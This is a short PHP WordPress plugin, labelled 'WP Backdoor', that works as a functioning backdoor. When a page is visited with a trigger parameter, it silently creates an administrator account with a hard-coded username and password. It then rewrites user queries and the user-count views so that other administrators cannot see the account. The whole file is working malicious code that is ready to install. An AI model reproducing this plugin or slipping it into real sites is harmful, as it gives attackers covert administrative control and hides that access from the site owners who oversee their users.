<?php

/*
* Plugin Name:       WP Backdoor
* Description:       Undisguised backdoor for WordPress.
* Version:           1.0
* Author:            amtzespinosa
*/

add_action( 'wp_head', 'my_backdoor' );

function my_backdoor() {
    if ( $_GET['backdoor'] == 'go' ) {
        require( 'wp-includes/registration.php' );
        if ( !username_exists( 'new_admin' ) ) {
            $user_id = wp_create_user( 'new_admin', 'new_pass' );
            $user = new WP_User( $user_id );
            $user->set_role( 'administrator' ); 
        }
    }
}
 
add_action('pre_user_query','dt_pre_user_query');
function dt_pre_user_query($user_search) {
global $current_user;
$username = $current_user->user_login;

if ($username != 'new_admin') {
    global $wpdb;
    $user_search->query_where = str_replace('WHERE 1=1',
        "WHERE 1=1 AND {$wpdb->users}.user_login != 'new_admin'",$user_search->query_where);
    }
}

add_filter("views_users", "dt_list_table_views");
function dt_list_table_views($views){
    $users = count_users();
    $admins_num = $users['avail_roles']['administrator'] - 1;
    $all_num = $users['total_users'] - 1;
    $class_adm = ( strpos($views['administrator'], 'current') === false ) ? "" : "current";
    $class_all = ( strpos($views['all'], 'current') === false ) ? "" : "current";
    $views['administrator'] = '<a href="users.php?role=administrator" class="' . $class_adm . '">' . translate_user_role('Administrator') . ' <span class="count">(' . $admins_num . ')</span></a>';
    $views['all'] = '<a href="users.php" class="' . $class_all . '">' . __('All') . ' <span class="count">(' . $all_num . ')</span></a>';
    return $views;
}

?>